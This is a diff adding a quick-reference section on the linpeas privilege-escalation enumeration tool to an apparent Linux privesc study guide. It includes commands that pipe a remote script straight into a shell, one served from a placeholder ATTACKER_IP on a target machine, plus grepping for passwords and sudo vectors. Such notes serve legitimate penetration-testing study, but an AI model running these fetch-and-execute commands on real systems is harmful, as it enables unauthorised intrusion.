@@ -48,6 +48,49 @@
 
 ---
 
+## Quick Reference
+
+### Essential Commands
+```bash
+./linpeas.sh                          # full enumeration
+./linpeas.sh -a                       # fast mode (less thorough, quicker)
+./linpeas.sh -q                       # quiet (no colors — for log capture)
+./linpeas.sh 2>/dev/null | tee out.txt  # save output
+curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+### Common Scenarios
+```bash
+# Transfer and run in one line (attacker serves file)
+python3 -m http.server 8000           # on attacker
+curl http://ATTACKER_IP:8000/linpeas.sh | sh  # on target
+
+# Quick wins only (fast mode)
+./linpeas.sh -a 2>/dev/null | grep -E 'CVE|SUID|password|sudo'
+
+# Save colored output for offline review
+./linpeas.sh | tee /tmp/lp.txt
+```
+
+### Color Code Key
+| Color | Meaning |
+|-------|---------|
+| RED/YELLOW | 95%+ privilege escalation vector |
+| RED | Highly interesting / likely exploitable |
+| YELLOW | Check manually |
+| GREEN | Low-risk info |
+
+### Key Flags
+| Flag | Meaning |
+|------|---------|
+| `-a` | Fast mode (skips slow checks) |
+| `-q` | Quiet/no-color output |
+| `-s` | Stealth (slower, less noise) |
+| `-P` | Pass a password for sudo checks |
+| `-d` | Extra network discovery |
+
+---
+
 # PHASE 1: FUNDAMENTALS & LINUX PRIVESC THEORY
 
 ---
